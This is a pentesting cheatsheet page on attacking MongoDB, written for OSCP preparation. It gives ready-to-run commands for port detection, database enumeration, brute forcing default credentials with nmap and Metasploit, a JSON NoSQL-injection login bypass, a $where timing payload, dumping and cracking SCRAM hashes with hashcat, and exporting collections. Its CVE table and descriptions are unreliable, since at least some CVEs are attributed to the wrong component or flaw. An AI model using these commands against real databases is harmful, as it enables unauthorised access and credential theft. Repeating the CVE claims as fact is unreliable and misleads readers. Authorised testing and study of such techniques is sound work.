# MongoDB

> Part of [Databases](./README.md) in the [Web Application Testing Cheatsheet](../../README.md).

**Contents:**

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Default and weak credentials](#3-default-and-weak-credentials)
- [4. Known CVEs](#4-known-cves)
- [5. Exploitation](#5-exploitation)
- [6. Post-exploitation](#6-post-exploitation)
- [7. OSCP notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### 1.1 Port and service

Default port **27017** (mongod). Shard servers: 27018, 27019. Config servers: 27019.

```bash
# Version + databases
nmap -sV -p 27017 <TARGET>
nmap -p 27017 --script mongodb-info,mongodb-databases <TARGET>

# Raw connect (MongoDB uses binary wire protocol - use mongosh, not nc)
mongosh --host <TARGET> --port 27017
```

Expected output:

```text
27017/tcp open  mongodb   MongoDB 4.4.6
| mongodb-info:
|   MongoDB Build info
|     version: 4.4.6
|   Databases
|     admin
|     config
|     local
```

### 1.2 Version to CVE mapping

| Version range | Notable CVEs |
|---------------|--------------|
| < 2.6 | No auth by default |
| 3.0 - 3.4 | CVE-2017-15535 (memory disclosure) |
| 3.6 - 4.0 | CVE-2019-2386 (auth bypass) |
| 4.4 - 5.0 | CVE-2021-20329 (NoSQL injection in driver) |
| <= 5.0.19 / 6.0.8 | CVE-2023-3102 (privilege escalation) |

---

## 2. Enumeration

### 2.1 Unauthenticated (legacy < 3.0)

MongoDB before 3.0 had no auth by default. If the port is open and unauthenticated, you get full access:

```javascript
// List databases
show dbs;

// Switch to a database
use <DBNAME>;

// List collections
show collections;

// Dump a collection
db.<COLLECTION>.find().pretty();

// Find interesting fields
db.users.find({}, {username: 1, password: 1, email: 1});
```

### 2.2 Authenticated

```javascript
// List users
use admin;
db.system.users.find();

// Current roles
db.runCommand({connectionStatus: 1});

// Database stats
db.stats();
```

### 2.3 Check version

```javascript
db.version();
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).
> This establishes which version and whether auth is enabled.

---

## 3. Default and weak credentials

### 3.1 Common defaults

| User | Password | Notes |
|------|----------|-------|
| admin | (empty) | Legacy |
| admin | admin | Common in dev |
| root | root | Custom setups |
| mongodb | mongodb | Some Docker images |

### 3.2 Brute force

```bash
# nmap NSE
nmap -p 27017 --script mongodb-brute <TARGET>

# Metasploit
msfconsole -q -x "use auxiliary/scanner/mongodb/mongodb_login; set RHOSTS <TARGET>; set USERNAME admin; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"
```

### 3.3 Connect with auth

```bash
mongosh "mongodb://<USER>:<PASS>@<TARGET>:27017/admin"
```

---

## 4. Known CVEs

| CVE | Affected | Impact | NVD |
|-----|----------|--------|-----|
| CVE-2017-15535 | MongoDB 3.4.10 | Memory disclosure via `$where` | https://nvd.nist.gov/vuln/detail/CVE-2017-15535 |
| CVE-2019-2386 | MongoDB 3.6-4.0 | Auth bypass via `$where` | https://nvd.nist.gov/vuln/detail/CVE-2019-2386 |
| CVE-2021-20329 | MongoDB Node.js driver < 3.6.10 | NoSQL injection (SSRF) | https://nvd.nist.gov/vuln/detail/CVE-2021-20329 |
| CVE-2023-3102 | MongoDB <= 5.0.19 / 6.0.8 | Privilege escalation via crafted `$where` | https://nvd.nist.gov/vuln/detail/CVE-2023-3102 |

---

## 5. Exploitation

### 5.1 NoSQL injection (application-level)

The classic web-app NoSQL injection targets login forms:

```text
POST /login
Content-Type: application/json

{"username": "admin", "password": {"$ne": null}}
```

The `$ne` operator matches any non-null value, bypassing password checks. See [SQLi and NoSQLi](../../07 Vulnerabilities/SQLi.md) for details.

### 5.2 JavaScript execution via `$where`

If the app uses `$where` with user-controlled input, arbitrary JS runs in the MongoDB process.

```javascript
db.users.find({$where: "this.username == 'admin' && sleep(5000)"});
```

Time-based blind NoSQLi uses this to confirm injection.

### 5.3 `$where` to OS command (rare, legacy)

MongoDB < 2.4 allowed `$where` to call system commands via `eval()`. Modern versions block this.

### 5.4 Privilege escalation (CVE-2023-3102)

If you have a low-priv account, crafted `$where` queries can elevate privileges. See NVD for details.

---

## 6. Post-exploitation

### 6.1 Dump all user hashes

```javascript
use admin;
db.system.users.find({}, {user: 1, credentials: 1});
```

The `credentials` field contains SCRAM-SHA-1 or SCRAM-SHA-256 salted hashes.

### 6.2 Crack hashes

MongoDB SCRAM hashes are not directly hashcat-crackable without transformation. Tools:

- `mongodb2hashcat` (converts to mode 24100)
- `hashcat -m 24100` (MongoDB ServerKey)

```bash
hashcat -m 24100 mongo_hashes.txt /usr/share/wordlists/rockyou.txt
```

### 6.3 Read application data

```javascript
// Dump entire collection
db.users.find().forEach(printjson);

// Export to file
mongoexport --host <TARGET> --db <DB> --collection users --out users.json
```

### 6.4 Reuse credentials

Credentials from `db.system.users` or app configs often work for SSH / other services.

---

## 7. OSCP notes

> [!IMPORTANT]
> OSCP report: screenshot the MongoDB connection (mongosh prompt + `show dbs` output) that proves access.

> [!IMPORTANT]
> OSCP report: screenshot any NoSQL injection that yields authentication bypass or data exfiltration.

> [!IMPORTANT]
> OSCP report: screenshot `db.system.users.find()` output if it yields credentials for lateral movement.

---

## 8. References

- MongoDB official docs: https://www.mongodb.com/docs/
- HackTricks - MongoDB: https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb
- PayloadsAllTheThings - NoSQL: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- CVE-2017-15535: https://nvd.nist.gov/vuln/detail/CVE-2017-15535
- CVE-2019-2386: https://nvd.nist.gov/vuln/detail/CVE-2019-2386
- CVE-2021-20329: https://nvd.nist.gov/vuln/detail/CVE-2021-20329
- CVE-2023-3102: https://nvd.nist.gov/vuln/detail/CVE-2023-3102

---